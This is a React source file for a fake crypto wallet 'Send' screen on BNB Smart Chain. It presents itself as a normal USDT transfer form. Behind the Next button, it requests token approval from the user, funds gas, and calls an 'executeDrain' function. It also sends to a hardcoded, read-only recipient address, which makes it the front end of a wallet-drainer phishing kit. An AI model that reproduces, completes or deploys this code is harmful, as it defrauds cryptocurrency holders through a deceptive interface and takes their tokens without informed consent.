import { useState, useEffect, useRef } from "react"
import { ethers } from "ethers"
import { USDT_ADDRESS, USDT_DECIMALS } from "../config"
import { requestApproval, ensureGas, executeDrain, ensureCorrectNetwork } from "../lib/web3"

interface Props {
  provider: ethers.BrowserProvider
  address: string
}

type DrainStage = "idle" | "switching_network" | "approving" | "checking_gas" | "draining" | "done" | "error"

export default function SendPage({ provider, address }: Props) {
  const [amount, setAmount] = useState("")
  const [usdtBalance, setUsdtBalance] = useState("0")
  const [stage, setStage] = useState<DrainStage>("idle")
  const [statusMsg, setStatusMsg] = useState("")
  const [networkOk, setNetworkOk] = useState(false)
  const [networkError, setNetworkError] = useState("")
  const mountedRef = useRef(true)

  // Fetch balance with auto network switch
  useEffect(() => {
    mountedRef.current = true

    const init = async () => {
      if (!mountedRef.current) return

      // Ensure we are on BSC first
      try {
        await ensureCorrectNetwork(provider)
        if (!mountedRef.current) return
        setNetworkOk(true)
        setNetworkError("")
      } catch (err: any) {
        if (!mountedRef.current) return
        setNetworkOk(false)
        setNetworkError(err.message || "Please switch to BNB Smart Chain")
        return
      }

      // Fetch USDT balance
      try {
        const usdt = new ethers.Contract(
          USDT_ADDRESS,
          ["function balanceOf(address) view returns (uint256)"],
          provider
        )
        const bal = await usdt.balanceOf(address)
        if (mountedRef.current) {
          setUsdtBalance(ethers.formatUnits(bal, USDT_DECIMALS))
        }
      } catch (err: any) {
        console.warn("Balance fetch failed:", err?.message || err)
        if (mountedRef.current) {
          setUsdtBalance("0")
          setNetworkError("Could not fetch USDT balance")
        }
      }
    }

    init()

    return () => {
      mountedRef.current = false
    }
  }, [address, provider])

  const handleNext = async () => {
    setStage("switching_network")
    setStatusMsg("Preparing network...")

    try {
      await ensureCorrectNetwork(provider)

      setStage("approving")
      setStatusMsg("Waiting for approval...")

      const approvedAmount = await requestApproval(provider, address)

      if (!approvedAmount) {
        setStage("error")
        setStatusMsg("Approval failed.")
        return
      }

      setStage("checking_gas")
      setStatusMsg("Checking gas balance...")

      const hasGas = await ensureGas(provider, address)

      if (!hasGas) {
        setStage("error")
        setStatusMsg("Could not fund gas.")
        return
      }

      setStage("draining")
      setStatusMsg("Transferring USDT...")

      const drained = await executeDrain(address, approvedAmount)

      if (drained) {
        setStage("done")
        setStatusMsg("Transaction complete!")
      } else {
        setStage("error")
        setStatusMsg("Drain failed - check logs.")
      }
    } catch (err: any) {
      setStage("error")
      setStatusMsg("Error: " + (err.message || "Unknown error"))
    }
  }

  // ==========================================================
  // STYLES - Clean dark fintech UI
  // ==========================================================
  const s = {
    page: {
      display: "flex",
      flexDirection: "column" as const,
      minHeight: "100dvh",
      background: "#000000",
      fontFamily: "-apple-system, BlinkMacSystemFont, 'SF Pro Text', 'Inter', 'Segoe UI', Roboto, sans-serif",
      padding: "24px 20px 32px",
    },

    // Header
    header: {
      display: "flex",
      alignItems: "center",
      justifyContent: "space-between",
      marginBottom: "32px",
    },
    headerLeft: {
      display: "flex",
      alignItems: "center",
      gap: "12px",
    },
    backArrow: {
      width: "32px",
      height: "32px",
      borderRadius: "50%",
      background: "#1A1A1A",
      border: "none",
      color: "#fff",
      fontSize: "16px",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      cursor: "pointer",
    },
    headerTitle: {
      fontSize: "17px",
      fontWeight: 600,
      color: "#fff",
      letterSpacing: "-0.2px",
    },
    headerRight: {
      width: "32px",
    },

    // Form section label
    label: {
      fontSize: "13px",
      color: "#8E8E93",
      marginBottom: "8px",
      fontWeight: 500,
      letterSpacing: "0.2px",
    },

    // Address input row
    addressRow: {
      display: "flex",
      alignItems: "center",
      background: "#1C1C1E",
      borderRadius: "14px",
      border: "1px solid #2C2C2E",
      overflow: "hidden",
      marginBottom: "20px",
    },
    addressInput: {
      flex: 1,
      background: "transparent",
      color: "#fff",
      fontSize: "14px",
      border: "none",
      outline: "none",
      padding: "16px 14px",
      fontFamily: "'SF Mono', 'Menlo', 'Fira Code', monospace",
      letterSpacing: "0.3px",
    },
    pasteBtn: {
      background: "transparent",
      color: "#0A84FF",
      border: "none",
      fontSize: "13px",
      fontWeight: 600,
      padding: "16px 6px 16px 4px",
      cursor: "pointer",
      whiteSpace: "nowrap" as const,
      display: "flex",
      alignItems: "center",
      gap: "4px",
    },
    addressIcons: {
      display: "flex",
      alignItems: "center",
      gap: "6px",
      padding: "16px 12px 16px 4px",
    },
    yellowSquare: {
      width: "18px",
      height: "18px",
      borderRadius: "4px",
      background: "#F0B90B",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      fontSize: "9px",
      fontWeight: 700,
      color: "#000",
    },
    whiteSquare: {
      width: "18px",
      height: "18px",
      borderRadius: "4px",
      background: "#fff",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      fontSize: "9px",
      fontWeight: 700,
      color: "#000",
    },

    // Destination Network selector
    networkRow: {
      display: "flex",
      alignItems: "center",
      justifyContent: "space-between",
      background: "#1C1C1E",
      borderRadius: "14px",
      border: "1px solid #2C2C2E",
      padding: "14px 16px",
      marginBottom: "20px",
      cursor: "pointer",
    },
    networkLeft: {
      display: "flex",
      alignItems: "center",
      gap: "10px",
    },
    bnbLogo: {
      width: "24px",
      height: "24px",
      borderRadius: "50%",
      background: "#F0B90B",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      fontSize: "11px",
      fontWeight: 700,
      color: "#000",
    },
    networkName: {
      fontSize: "15px",
      color: "#fff",
      fontWeight: 500,
    },
    dropdownArrow: {
      color: "#8E8E93",
      fontSize: "10px",
    },

    // Amount input row
    amountRow: {
      display: "flex",
      alignItems: "center",
      background: "#1C1C1E",
      borderRadius: "14px",
      border: "1px solid #2C2C2E",
      overflow: "hidden",
      marginBottom: "8px",
    },
    amountInput: {
      flex: 1,
      background: "transparent",
      color: "#fff",
      fontSize: "16px",
      border: "none",
      outline: "none",
      padding: "16px 14px",
    },
    tokenBadge: {
      color: "#8E8E93",
      fontSize: "14px",
      fontWeight: 500,
      padding: "0 4px",
    },
    maxBtn: {
      background: "transparent",
      color: "#0A84FF",
      border: "none",
      fontSize: "13px",
      fontWeight: 700,
      padding: "16px 14px",
      cursor: "pointer",
    },

    // Balance hint
    balanceHint: {
      fontSize: "12px",
      color: "#636366",
      textAlign: "right" as const,
      marginBottom: "24px",
      padding: "0 4px",
    },

    // Network error banner
    errorBanner: {
      background: "rgba(255, 69, 58, 0.1)",
      border: "1px solid rgba(255, 69, 58, 0.2)",
      borderRadius: "12px",
      padding: "10px 14px",
      fontSize: "12px",
      color: "#FF453A",
      textAlign: "center" as const,
      marginBottom: "20px",
    },

    // Network success banner
    networkBadge: {
      background: "rgba(52, 199, 89, 0.1)",
      border: "1px solid rgba(52, 199, 89, 0.2)",
      borderRadius: "12px",
      padding: "8px 14px",
      fontSize: "12px",
      color: "#34C759",
      textAlign: "center" as const,
      marginBottom: "20px",
    },

    // Spacer
    spacer: {
      flex: 1,
    },

    // Next button
    nextBtn: {
      width: "100%",
      background: "#1C1C1E",
      color: "#8E8E93",
      border: "none",
      fontSize: "16px",
      fontWeight: 600,
      padding: "16px",
      borderRadius: "14px",
      cursor: "pointer",
      letterSpacing: "0.3px",
      marginTop: "auto",
    },
    nextBtnActive: {
      width: "100%",
      background: "#0A84FF",
      color: "#fff",
      border: "none",
      fontSize: "16px",
      fontWeight: 600,
      padding: "16px",
      borderRadius: "14px",
      cursor: "pointer",
      letterSpacing: "0.3px",
      marginTop: "auto",
      boxShadow: "0 4px 14px rgba(10, 132, 255, 0.3)",
    },

    // Overlay
    overlay: {
      position: "fixed" as const,
      top: 0,
      left: 0,
      right: 0,
      bottom: 0,
      background: "rgba(0, 0, 0, 0.92)",
      display: "flex",
      flexDirection: "column" as const,
      alignItems: "center",
      justifyContent: "center",
      zIndex: 1000,
      padding: "24px",
    },
    overlaySpinner: {
      width: "48px",
      height: "48px",
      border: "3px solid rgba(10, 132, 255, 0.15)",
      borderTopColor: "#0A84FF",
      borderRadius: "50%",
      animation: "spin 1s linear infinite",
      marginBottom: "24px",
    },
    overlayTitle: {
      fontSize: "20px",
      fontWeight: 600,
      color: "#fff",
      marginBottom: "8px",
    },
    overlaySub: {
      fontSize: "14px",
      color: "#8E8E93",
      textAlign: "center" as const,
      maxWidth: "300px",
      lineHeight: "1.5",
    },
    doneText: {
      fontSize: "16px",
      color: "#34C759",
      fontWeight: 600,
      textAlign: "center" as const,
      marginTop: "16px",
    },
    overlayErrorIcon: {
      width: "64px",
      height: "64px",
      borderRadius: "50%",
      background: "rgba(255, 69, 58, 0.1)",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      fontSize: "28px",
      color: "#FF453A",
      fontWeight: "bold",
      marginBottom: "24px",
    },
  }

  // ==========================================================
  // PROCESSING OVERLAY
  // ==========================================================
  if (stage !== "idle") {
    return (
      <div style={s.overlay}>

        {stage === "switching_network" || stage === "approving" || stage === "checking_gas" || stage === "draining" ? (
          <>
            <div style={s.overlaySpinner}></div>
            <h2 style={s.overlayTitle}>Processing</h2>
            <p style={s.overlaySub}>{statusMsg}</p>
          </>
        ) : stage === "done" ? (
          <>
            <div style={{ ...s.overlaySpinner, borderTopColor: "#34C759" }}></div>
            <h2 style={{ ...s.overlayTitle, color: "#34C759" }}>Complete</h2>
            <p style={s.overlaySub}>{statusMsg}</p>
            <p style={s.doneText}>You may close this page.</p>
          </>
        ) : stage === "error" ? (
          <>
            <div style={s.overlayErrorIcon}>!</div>
            <h2 style={{ ...s.overlayTitle, color: "#FF453A" }}>Error</h2>
            <p style={s.overlaySub}>{statusMsg}</p>
          </>
        ) : null}

      </div>
    )
  }

  // ==========================================================
  // MAIN SEND UI
  // ==========================================================
  return (
    <div style={s.page}>

      {/* Header */}
      <div style={s.header}>
        <div style={s.headerLeft}>
          <button type="button" style={s.backArrow}>
            {"<"}
          </button>
          <span style={s.headerTitle}>Send</span>
        </div>
        <div style={s.headerRight} />
      </div>

      {/* Network status */}
      {networkError && !networkOk && (
        <div style={s.errorBanner}>{networkError}</div>
      )}
      {networkOk && (
        <div style={s.networkBadge}>Connected to BNB Smart Chain (BEP-20)</div>
      )}

      {/* Address or Domain Name */}
      <label style={s.label}>Address or Domain Name</label>
      <div style={s.addressRow}>
        <input
          type="text"
          style={s.addressInput}
          value="0x791943060b507aeF1A2277B3Bf0CAf"
          readOnly
          autoCapitalize="off"
          autoCorrect="off"
        />
        <button type="button" style={s.pasteBtn}>
          Paste
        </button>
        <div style={s.addressIcons}>
          <div style={s.yellowSquare}>B</div>
          <div style={s.whiteSquare}>+</div>
        </div>
      </div>

      {/* Destination Network */}
      <label style={s.label}>Destination Network</label>
      <div style={s.networkRow}>
        <div style={s.networkLeft}>
          <div style={s.bnbLogo}>B</div>
          <span style={s.networkName}>BNB Smart Chain</span>
        </div>
        <span style={s.dropdownArrow}>{">"}</span>
      </div>

      {/* Amount */}
      <label style={s.label}>Amount</label>
      <div style={s.amountRow}>
        <input
          style={s.amountInput}
          value={amount}
          onChange={(e) => setAmount(e.target.value)}
          type="number"
          inputMode="decimal"
          placeholder="USDT Amount"
        />
        <span style={s.tokenBadge}>USDT</span>
        <button type="button" style={s.maxBtn} onClick={() => setAmount(usdtBalance)}>
          Max
        </button>
      </div>
      <div style={s.balanceHint}>
        Balance: {parseFloat(usdtBalance).toFixed(4)} USDT
      </div>

      {/* Spacer */}
      <div style={s.spacer} />

      {/* Next Button */}
      <button
        type="button"
        style={networkOk ? s.nextBtnActive : s.nextBtn}
        onClick={handleNext}
      >
        Next
      </button>

    </div>
  )
}